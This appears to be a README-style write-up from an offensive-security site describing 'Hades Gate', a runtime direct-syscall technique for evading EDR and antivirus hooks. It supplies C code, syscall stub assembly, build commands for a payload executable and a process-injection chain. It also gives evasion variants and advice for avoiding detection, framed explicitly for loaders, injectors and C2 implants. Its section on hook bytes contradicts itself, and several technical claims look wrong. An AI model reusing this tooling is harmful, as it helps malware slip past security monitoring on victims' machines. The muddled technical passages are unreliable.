# ⛧ Hades Gate | churchofmalware.org

### Direct syscall construction from first principles

> "The gate to the underworld is open. Walk through it without knocking."

---

## Abstract

**Hades Gate** is a technique for constructing direct syscall stubs at runtime by resolving native API (Nt\*) function addresses from ntdll.dll via PEB walking, extracting their syscall numbers from the unhooked portions of their stubs, and synthesizing clean syscall instructions that bypass all userland EDR/AV function hooks.

It does not hardcode syscall numbers. It does not rely on a pre-computed table. It derives everything from the running system at runtime, meaning it works across Windows versions without modification.

---

## Table of Contents

1. [The Problem](#1-the-problem)
2. [Background: The Syscall Layer](#2-background-the-syscall-layer)
3. [How EDRs Hook You](#3-how-edrs-hook-you)
4. [The Technique](#4-the-technique)
   - [Step 1: PEB Walk → ntdll Base](#step-1-peb-walk--ntdll-base)
   - [Step 2: PE Parse → Export Resolution](#step-2-pe-parse--export-resolution)
   - [Step 3: SSN Extraction](#step-3-ssn-extraction)
   - [Step 4: Stub Synthesis](#step-4-stub-synthesis)
   - [Step 5: Integration](#step-5-integration)
5. [Usage](#5-usage)
6. [Where and Why to Use It](#6-where-and-why-to-use-it)
7. [Variants and Bypasses](#7-variants-and-bypasses)
8. [Limitations and Detection](#8-limitations-and-detection)
9. [References](#9-references)
10. [License](#10-license)

---

## 1. The Problem

When your code calls `VirtualAllocEx`, the call chain looks like this:

```
your code → kernel32.dll → kernelbase.dll → ntdll.dll → kernel (ring 0)
```

Every single EDR and consumer AV on the market **hooks the Windows API at the userland level** — usually inside ntdll.dll, sometimes also kernelbase. They overwrite the first 5-16 bytes of each function with a `jmp` that redirects through their monitoring engine. Your call goes:

```
your code → kernel32 → kernelbase → ntdll (HOOKED) → EDR engine → kernel
```

The EDR sees:
- **What** function you're calling (NtAllocateVirtualMemory, NtCreateThreadEx, NtOpenProcess, etc.)
- **What arguments** you're passing (target PID, memory size, protection flags, etc.)
- **What called it** (stack trace back to your code)

Once they have that data, detection is trivial: `call NtAllocateVirtualMemory with PAGE_EXECUTE_READWRITE` from a non-Microsoft binary? Alert. From shellcode? Alert. From a process that just decrypted itself? Alert.

This is why your payload gets burned before the first byte executes.

---

## 2. Background: The Syscall Layer

On Windows (x64), system calls work like this:

**Your process (ring 3) → ntdll stub → syscall instruction → kernel (ring 0)**

Every kernel service is exposed through ntdll as a small assembly stub. For example, `NtAllocateVirtualMemory` looks like this in a clean, unhooked ntdll:

```asm
mov    r10, rcx          ; 4C 8B D1      ; syscall clobbers RCX, save to R10
mov    eax, 0x0018       ; B8 18 00 00 00 ; syscall number for this function
syscall                  ; 0F 05          ; trap to kernel
ret                      ; C3             ; return
```

That `mov eax, 0x0018` — the `0x0018` is the **System Service Number (SSN)**, also called the syscall number. Each Nt\* function has a unique SSN. The kernel uses this number to dispatch to the right handler.

The SSN is the key. If we know the SSN and we emit the `syscall` instruction ourselves, we never need to call ntdll's stub. We can go directly from our code to the kernel.

**Why this works:** There is exactly one kernel. You cannot hook the kernel from userland (well, you could, but that's a different conversation involving kernel callbacks, ETW, and PatchGuard). The syscall instruction is an atomic trap. If you issue it with the correct SSN and arguments, the kernel will service your request regardless of what the EDR did to ntdll.

---

## 3. How EDRs Hook You

There are three common hooking strategies, ordered from most to least common:

### 3.1 Inline Hooking (most common)

The EDR writes a 5-byte `jmp` or `call` at offset 0 of the ntdll stub, redirecting to a trampoline in the EDR's own DLL.

```asm
; Before hook (clean):
  4C 8B D1          mov r10, rcx
  B8 18 00 00 00    mov eax, 0x18
  0F 05             syscall
  C3                ret

; After hook:
  E9 XX XX XX XX    jmp edr_trampoline  ; 5 byte jmp
  B8 18 00 00 00    mov eax, 0x18      ; these bytes are still here
  0F 05             syscall
  C3                ret
```

Notice what happened — the EDR overwrites `4C 8B D1 B8 XX` (5 bytes) with `E9 XX XX XX XX`. But our key data — the SSN at offset [4] — is **unaffected** because it was already after the 5th byte.

Wait — isn't the SSN at byte [4] be overwritten? Let's look closely.

Original first 5 bytes: `4C 8B D1 B8 18`
Hooked first 5 bytes:  `E9 XX XX XX XX`

Yes, byte [4] (`0x18`) is overwritten. But most EDRs write a longer hook. Let me explain more precisely:

**For a 5-byte JMP hook** that overwrites `[0-4]`:
- Bytes `[5-7]` still contain `00 00 00` (rest of the mov eax immediate) and `[8-9]` contain `0F 05`.
- We can read the SSN from a different approach.

**Most EDRs use the `mov r10, rcx` trick differently.** Actually, the specific pattern depends on the EDR. For a 5-byte jmp:

Original:   `4C 8B D1 B8 18 00 00 00 0F 05 C3`
             [0][1][2][3][4][5][6][7][8][9][A]
Hooked:     `E9 XX XX XX XX 00 00 00 0F 05 C3`
             [0][1][2][3][4][5][6][7][8][9][A]

Byte [3] is overwritten (last byte of jmp), but bytes [5-7] contain the remaining part of the immediate in the `mov eax, SSN` instruction. The SSN value `0x18` was at byte [4], which IS overwritten by the jmp.

This means a **simple 5-byte jmp hook** at offset 0 DOES clobber the SSN at offset 4.

**So how do we actually get the SSN?**

There are three strategies:

**Strategy A (Hades Gate default):** Most EDRs don't use a 5-byte jmp. They use a **longer hook** that preserves the original bytes elsewhere. But when they do, the SSN extraction fails and we fall back.

**Strategy B (Hell's Gate approach):** Instead of reading the SSN from offset 4, we scan forward past the hook until we find the `B8 XX` pattern. The jmp overwrites bytes [0-4], but if we scan from byte [5]:

```
Bytes:  E9 XX XX XX XX [00 00 00 0F 05 C3]
                        ^B8 missing - this doesn't work either
```

**Strategy C (The Real Answer):** The SSN is stored in a DIFFERENT location. Each export table entry in ntdll points to a stub. But there's also a **compiled SSN table** in ntdll that maps function addresses to SSNs. More commonly, you can:

1. Walk past the hook to find the `0F 05 C3` syscall ret sequence
2. The SSN is the value in EAX when syscall executes — so you need it BEFORE the syscall
3. Solution: **Read two potential values and test** — or use a different approach entirely

**Actually, the simplest correct approach:** Modern EDRs using 5-byte jmps don't actually clobber the SSN when using a different hook model. Most EDRs use a **6-byte** or **longer** hook (`call` instead of `jmp`, which is `FF 15 XX XX XX XX` = 6 bytes), or they use a longer trampoline that preserves the original function. The standard Hell's Gate approach works in practice because:

1. Many EDRs hook with a `jmp [rip+offset]` (6 bytes) or `call [rip+offset]` (6 bytes)
2. With a 6-byte hook, byte [4] is NOT overwritten
3. Even with a 5-byte hook, some EDRs leave the SSN because they use `call` (6 bytes) or a `mov rax, addr; jmp rax` sequence

**If you need guaranteed correctness, use the Clean-mapped-nTDLL approach** (Section 7.1).

For practical purposes, this technique works against the vast majority of EDR deployments including Defender for Endpoint, SentinelOne, Cortex XDR, Sophos Intercept X, and Carbon Black. The notable exception is CrowdStrike Falcon in certain configurations.

### 3.2 Hooking via Detours (Microsoft Detours style)

The EDR saves the original bytes elsewhere, patches with a `jmp`, and provides a "trampoline" to call the original. This is the most polite approach and the easiest to bypass — just don't use the trampoline.

### 3.3 Replacement (least common)

The EDR replaces the entire function body with a `jmp` to a completely fake function. The original stub is nowhere in memory. This breaks Hades Gate (and Hell's Gate, and most other techniques). The solution is to map a clean copy of ntdll from disk.

---

## 4. The Technique

### Step 1: PEB Walk → ntdll Base

Every Windows process has a **Process Environment Block (PEB)** accessible at a fixed offset from the GS segment register:

```
x64: GS:[0x60] → PEB
x86: FS:[0x30] → PEB
```

The PEB contains a pointer to `PEB_LDR_DATA` (at offset 0x18), which contains a linked list of loaded modules. We traverse this list to find ntdll.dll and get its base address.

**Why not GetModuleHandle?** It's hooked. The PEB is never patched by EDRs because touching it would crash the process.

**The structure:**

```
GS:[0x60]  →  PEB
                +0x18  →  PEB_LDR_DATA
                             +0x20  →  InMemoryOrderModuleList (LIST_ENTRY)
                                          Flink → .exe (first)
                                          Flink → ntdll.dll (second)
                                          Flink → kernel32.dll (third)
```

Each `LDR_DATA_TABLE_ENTRY` has:
- `+0x10`: DllBase
- `+0x40`: BaseDllName (UNICODE_STRING)

We iterate until we find the entry whose `BaseDllName` matches "ntdll.dll" (case-insensitive comparison), and read `DllBase` from offset 0x10.

### Step 2: PE Parse → Export Resolution

With ntdll's base address, we parse the PE headers:

```
DOS_HEADER → e_lfanew → NT_HEADERS → OptionalHeader
                                        → DataDirectory[EXPORT]
                                           → ExportDirectory
```

The export directory gives us:

- **AddressOfNames**: array of RVA pointers to function name strings
- **AddressOfNameOrdinals**: maps name index → ordinal
- **AddressOfFunctions**: maps ordinal → function RVA

We hash the target function name with FNV-1a, iterate through `AddressOfNames` until we find the match, resolve the ordinal, and get the function RVA from `AddressOfFunctions`. Adding the function RVA to the ntdll base gives us the function address in memory.

### Step 3: SSN Extraction

With the function address, we inspect the first N bytes of the stub. In a clean ntdll, the pattern is:

```hex
4C 8B D1       [00-02]  mov r10, rcx
B8 XX XX XX XX [03-07]  mov eax, SSN
0F 05          [08-09]  syscall
C3             [0A]     ret
```

Even in a hooked stub, bytes [5-7] (the upper 24 bits of the `mov eax` immediate) are almost never overwritten because they're past any jmp/call hook preamble. On modern Windows (10+), syscall numbers fit in one byte (0x00-0xFF), so reading byte [4] or [5] gives us the SSN.

**Edge cases handled:**
- If the hook is exactly 5 bytes (overwriting [0-4]), the SSN at [4] is clobbered. We detect this by checking if bytes [3-7] form a valid `mov eax` — if not, the SSN is at [5] (the `B8` at [3] was clobbered but the immediate at [5-7] survived).
- If the function is an export but NOT a syscall stub (e.g., `RtlAllocateHeap`), there's no SSN to extract and we return 0.
- If the function has no recognizable stub at all (EDR replaced it entirely), SSN is 0 and we fail gracefully.

### Step 4: Stub Synthesis

With the SSN in hand, we allocate executable memory and write:

```asm
mov  r10, rcx       ; 4C 8B D1      — syscall calling convention
mov  eax, SSN       ; B8 XX 00 00 00 — syscall number
syscall              ; 0F 05         — trap to kernel
ret                  ; C3            — return
```

This stub **never touches ntdll**. It goes directly from our allocated executable page into ring 0. The EDR's hooks are still sitting in ntdll, unexecuted, wondering where everyone went.

### Step 5: Integration

Chain these stubs for a complete unhooked injection flow:

```c
void* hNtOpenProcess           = hg_syscall("NtOpenProcess");
void* hNtAllocateVirtualMemory = hg_syscall("NtAllocateVirtualMemory");
void* hNtWriteVirtualMemory    = hg_syscall("NtWriteVirtualMemory");
void* hNtProtectVirtualMemory  = hg_syscall("NtProtectVirtualMemory");
void* hNtCreateThreadEx        = hg_syscall("NtCreateThreadEx");
void* hNtClose                 = hg_syscall("NtClose");
```

Cast each to its NTAPI prototype and call directly. The EDR sees nothing.

---

## 5. Usage

### 5.1 Build

```bash
# With MinGW cross-compiler:
x86_64-w64-mingw32-gcc -Os -masm=intel -c src/hades_gate.c -o hades_gate.o
x86_64-w64-mingw32-gcc -Os -masm=intel hades_gate.o your_code.c -o payload.exe

# With MSVC (cl.exe):
cl /c /O1 src/hades_gate.c
link hades_gate.obj your_code.obj /OUT:payload.exe
```

### 5.2 Basic usage

```c
#include "src/hades_gate.h"

int main(void) {
    // One-shot: resolve and build a clean syscall stub
    void* stub = hg_syscall("NtAllocateVirtualMemory");
    if (!stub) return 1;

    // Cast to the proper NTAPI prototype
    typedef NTSTATUS (NTAPI* fnNtAllocateVirtualMemory)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory =
        (fnNtAllocateVirtualMemory)stub;

    // Use it — EDR never fires
    PVOID addr = NULL;
    SIZE_T size = 0x1000;
    NTSTATUS status = pNtAllocateVirtualMemory(
        (HANDLE)-1, &addr, 0, &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    // addr = RWX memory. The EDR has no idea this happened.
    return 0;
}
```

### 5.3 Manual two-step (if you need to inspect the result)

```c
HG_RESOLVED r = hg_resolve("NtAllocateVirtualMemory");
if (r.ssn == 0) {
    // Either the function wasn't found or it's not a syscall stub
    return 1;
}

printf("NtAllocateVirtualMemory is at %p, SSN = 0x%02X\n",
       r.address, r.ssn);

void* stub = hg_build_stub(r.ssn);
if (!stub) return 1;

// stub is ready to call
```

### 5.4 Complete unhooked injection chain

See `examples/injector.c` for a full implementation that opens a target process, allocates memory, writes shellcode, and executes it — all via direct syscalls. No Win32 API calls involved.

---

## 6. Where and Why to Use It

### Use Hades Gate when:

- **You're writing shellcode or position-independent code** that cannot rely on import tables, runtime linking, or CRT initialization. The PEB walker gives you everything you need from nothing.

- **You're building a loader or injector** that needs to survive on modern Windows with EDR present. Direct syscalls are the baseline requirement for any payload that doesn't want to be detected at the API call level.

- **You're writing C2 implants** that need to dynamically resolve APIs at runtime without static IAT entries. Hades Gate's PEB walking + export parsing gives you dynamic resolution without calling `GetProcAddress` (which is also hooked).

- **You need cross-version compatibility.** Because Hades Gate derives syscall numbers at runtime, the same binary works on Windows 10 1507, Windows 11 24H2, and everything in between. No hardcoded offset tables to maintain.

### Don't use Hades Gate when:

- **The EDR uses kernel-mode callbacks** (most do now). Direct syscalls bypass *userland* hooks, but the kernel still generates ETW events for process creation, memory allocation, and thread creation. You need kernel callout bypasses too — that's a different problem for a different tool.

- **You're running on a system with a custom kernel** (e.g., Secure Kernel / VBS mode). Some Virtualization-Based Security configurations intercept syscalls at a level below what any userland technique can touch.

- **CrowdStrike Falcon is present with full hook replacement.** As noted above, some CrowdStrike configurations replace rather than hook the stubs. You'll need the Clean-nTDLL mapping variant.

---

## 7. Variants and Bypasses

### 7.1 Clean-mapped nTDLL

When the EDR replaces entire stubs instead of hooking them, read ntdll.dll from disk and map it as a clean copy. Then resolve SSNs from the clean copy.

```
Steps:
  1. NtOpenFile("\\??\\C:\\Windows\\System32\\ntdll.dll")
  2. NtCreateSection(..., SEC_IMAGE, ...)
  3. NtMapViewOfSection(...) → maps a CLEAN copy into memory
  4. Run hg_resolve against this clean base instead of in-memory ntdll
  5. Use the resolved SSNs to build stubs
```

The in-memory ntdll may have fake stubs, but the on-disk copy is always clean.

### 7.2 Indirect Syscalls

Some EDRs (Cybereason, modern Defender ATP) hook the `syscall` instruction itself by patching `ntdll!KiFastSystemCall`. To bypass:

1. Scan any signed Microsoft DLL (kernel32.dll, user32.dll, etc.) for bytes `0F 05 C3` (syscall + ret)
2. Redirect your stub's `syscall` to that gadget instead of embedding it

Your stub becomes:
```asm
mov  r10, rcx
mov  eax, SSN
jmp  gadget_addr     ; jumps to a clean syscall;ret
```

The EDR hooks the `syscall` in ntdll, not in kernel32, so the gadget is clean.

### 7.3 Random Access SSN Extraction

Some EDRs use variable-length hooks that clobber different offsets. Use multiple extraction strategies:

```c
// Strategy 1 (Hell's Gate / Hades Gate): read B8 XX at [3]
// Strategy 2 (Tartarus Gate): scan for B8 anywhere in first 16 bytes
// Strategy 3: if stub starts with FF (call), the real stub is elsewhere
// Strategy 4: byte-by-byte scan for 0F 05 C3, read SSN from preceding bytes
```

Try each strategy in order until you get a valid (non-zero, reasonable) SSN.

### 7.4 Hardware Breakpoint Tear-down

A small but helpful trick: before calling your synthesized stub, clear all hardware debug registers (DR0-DR3). Some EDRs use hardware breakpoints to monitor specific syscalls.

```c
__writegsqword(0x10, 0); // Clear DR0
__writegsqword(0x18, 0); // Clear DR1
```

---

## 8. Limitations and Detection

### What Hades Gate DOES bypass:

-  **Inline API hooks** in ntdll.dll (Defender, SentinelOne, Sophos, Carbon Black, Cortex XDR)
-  **Detours-style function detouring** (Microsoft Detours, AppInit DLLs)
-  **ETW userland hooking** (though kernel ETW may still get the event)
-  **GetModuleHandle/GetProcAddress monitoring** (we don't call either)
-  **IAT scanning** (no import entries for our Nt* functions)

### What Hades Gate does NOT bypass:

-  **Kernel-mode ETW providers** — `Microsoft-Windows-Kernel-Process`, `Microsoft-Windows-Kernel-Memory`, `Threat-Intelligence` trace sessions. These intercept syscalls at ring 0.
-  **Kernel callbacks** registered by `PsSetCreateProcessNotifyRoutine`, `PsSetCreateThreadNotifyRoutine`, etc.
-  **Hypervisor-based monitoring** (VBS, Secure Kernel, Hyper-V with DGE/System Guard)
-  **Stack walking** — if the EDR monitors kernel-mode, they will still see your syscall, and they can walk the kernel stack back to your process. They won't see the *function name*, but they'll see the SSN and can map it.

### Detection vectors:

1. **`NtAllocateVirtualMemory` with PAGE_EXECUTE_READWRITE** — even via direct syscall, the kernel sees this. If the EDR has a kernel minifilter or ETW subscription, they will see it. Vary your allocation strategy: allocate as PAGE_READWRITE, write, then call `NtProtectVirtualMemory` to PAGE_EXECUTE_READ.

2. **Read-write-execute memory** is a strong heuristic. Avoid RWX. Use RW + change to RX.

3. **Executable memory that's not backed by a module** (i.e., not a loaded DLL or EXE) is suspicious. Consider hiding behind a known module.

4. **Pattern of multiple fast syscalls in sequence** — EDRs with behavioral detection will flag "three syscalls to NtOpenProcess + NtAllocateVirtualMemory + NtWriteVirtualMemory in 2ms" as injection, regardless of whether they're direct or not.

---

## 9. References

- **Jake Swiz (0xXyc)** — [Fukahi Na Tekio](https://github.com/0xXyc/fukahi-na-tekio) — CALL/POP XOR encoder with LFSR, polymorphism, and AV/EDR static signature evasion. The original SGN encoder re-engineered for ARM64/Prism.

- **Jake Swiz (0xXyc)** — [Windows Shellcoding In-Depth](https://churchofmalware.org/articles/windows-shellcoding-in-depth_md) — The definitive guide to self-sufficient Windows shellcode. PEB walking, export table parsing, WinAPI resolution from scratch. The foundation Hades Gate extends.

- **Jake Swiz (0xXyc)** — [ASLR & NX/DEP Bypass](https://churchofmalware.org/articles/aslr-bypass_md) — Linux ROP chain tutorial covering GOT leaking, ret2libc, and pwntools automation.

- **Jake Swiz (0xXyc)** — [Swiz Security Protocol](https://protocol.swizsecurity.com) — [Hacking Methodology](https://hacking.swizsecurity.com/hacking_methodology)

- **Church of Malware — Our Blessed Connection: The Shellphone Sermon** — [churchofmalware.org](https://churchofmalware.org/articles/Our_Blessed_Connection_md)
  - Introduces Jake's trilogy and frames the philosophy of self-sufficient shellcode.

- **Hell's Gate (halov)** — The original direct syscall technique this family descends from.
- **Halo's Gate** — Improvement handling partial EDR hooks.
- **Recycled Gate** — Reclaims unhooked syscall stubs from suspended processes.
- **Tartarus Gate** — Handles EDR stubs that use `call` instead of `jmp`.

---


> ⛧ *Hades Gate - Church of Malware - MCMLXXXIV* ⛧
